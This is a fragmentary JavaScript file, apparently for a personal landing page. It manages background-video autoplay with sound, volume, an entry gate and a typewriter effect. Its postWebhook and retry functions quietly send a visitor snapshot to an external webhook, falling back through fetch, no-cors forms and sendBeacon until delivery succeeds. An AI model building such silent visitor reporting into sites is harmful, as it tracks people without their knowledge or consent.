...
const PLAY_EVENTS = ["loadstart", "loadedmetadata", "loadeddata", "canplay", "canplaythrough", "playing"];
...
function applyVolume() {
  ...
  if (!bgVideo) return;
  bgVideo.volume = savedVolume;
  volumeControl?.classList.toggle("muted", savedVolume === 0 || bgVideo.muted);
}

function setVolume(level) {
  savedVolume = Math.min(Math.max(level, 0), 1);
  persistVolume();
  applyVolume();
...
function isPlayingWithSound() {
  return bgVideo && !bgVideo.paused && !bgVideo.muted && bgVideo.volume > 0;
}
...
function startPlayRetry() {
  ...
  setTimeout(stopPlayRetry, 60000);
}

async function prepVideo() {
  if (!bgVideo || siteEntered) return;
  coverVideo();
...
async function attemptPlay() {
  ...
  if (!playRetryTimer) startPlayRetry();
...
function bindVideoAutoplay() {
  ...
  PLAY_EVENTS.forEach((event) => {
    bgVideo.addEventListener(event, () => {
      if (siteEntered) attemptPlay();
      else prepVideo();
    });
  });
  ...
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && siteEntered) attemptPlay();
  });
...
function updateMuteBtn() {
  ...
  const muted = bgVideo.muted || savedVolume === 0;
...
function toggleMute() {
  if (!bgVideo) return;
  if (bgVideo.muted || savedVolume === 0) {
    if (savedVolume === 0) savedVolume = 1;
    enableSound();
    bgVideo.play().catch(() => {});
    updateMuteBtn();
...
function postWebhook(payload) {
  ...
  function sendBeaconForm() {
    try {
      const form = new FormData();
      form.append("payload_json", payloadJson);
      return Promise.resolve(navigator.sendBeacon(url, form));
    } catch {
  ...
  return fetch(url, {
    ...
    .then((fetchOk) => {
      ...
      return sendNoCorsForm().catch(() => false);
    })
    .then((sent) => {
      if (sent) return true;
      return sendBeaconForm();
    });
}
...
function queueWebhookSend() {
  if (webhookSent) return;
  if (flushPendingWebhook()) return;
  scheduleWebhookRetry();
}

function flushPendingWebhook() {
  if (webhookSent || !visitorSnapshot || !getWebhookUrl()) return false;
  sendWebhook(visitorSnapshot);
  return true;
}

function scheduleWebhookRetry() {
  const retry = () => flushPendingWebhook();
...
function enterSite() {
  if (mainShown && siteEntered) return;
  ...
  if (window.__skidMainDone && !mainShown) {
    mainShown = true;
    revealVideo().catch(() => attemptPlay());
    runTypewriter();
    return;
  }

  if (!mainShown) showMain();
}
...
window.__skidEnter = enterSite;
window.__skidAppReady = true;

if (window.__skidPendingEnter || (window.__skidMainDone && !mainShown)) {
  window.__skidPendingEnter = false;
  enterSite();
}

window.__skidShowMain = showMain;
